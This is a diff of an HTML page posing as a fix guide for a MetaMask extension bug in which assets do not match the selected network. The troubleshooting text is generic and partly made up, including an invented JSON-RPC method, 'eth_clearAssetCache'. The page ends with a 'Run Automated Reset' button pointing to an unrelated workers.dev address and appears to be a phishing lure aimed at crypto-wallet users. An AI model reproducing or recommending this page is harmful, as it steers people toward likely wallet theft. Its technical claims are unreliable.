@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Miss Match Between Network Picker – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,29 +42,35 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which incorrectly shows "All popular" assets.</li>
+<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which is supposed to show "All popular" assets but instead shows assets from a different network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a desynchronization between the network configuration and the asset retrieval mechanism, likely caused by a caching issue or an outdated extension version.</li>
+<li>The error occurs due to a bug in the Metamask extension that fails to update the asset list when the user switches between different Ethereum networks, resulting in a mismatch between the expected and actual assets displayed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the Metamask extension to the latest version and restart the browser.</li>
-<li>Clear the browser's cache and local storage for the Metamask extension.</li>
-<li>Run the following command to reset the Metamask configuration:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Refresh the Metamask extension and retry the asset selection process.</li>
+<li>Manually update the asset list by adding or removing assets from the "All popular" list.</li>
+<li>Execute the following JSON-RPC command to reset the asset cache:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;reset&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_clearAssetCache&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute low-level commands for a more precise reset.</p>
+<p>For a more permanent fix, consider using an external console to diagnose and resolve the issue.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled.</li>
-<li>Ethereum network selected in the Metamask network picker.</li>
-<li>Latest browser version with compatible Metamask extension support.</li>
+<li>Metamask extension installed and configured on the browser</li>
+<li>Ethereum network selected and connected</li>
+<li>Asset list populated with "All popular" assets</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
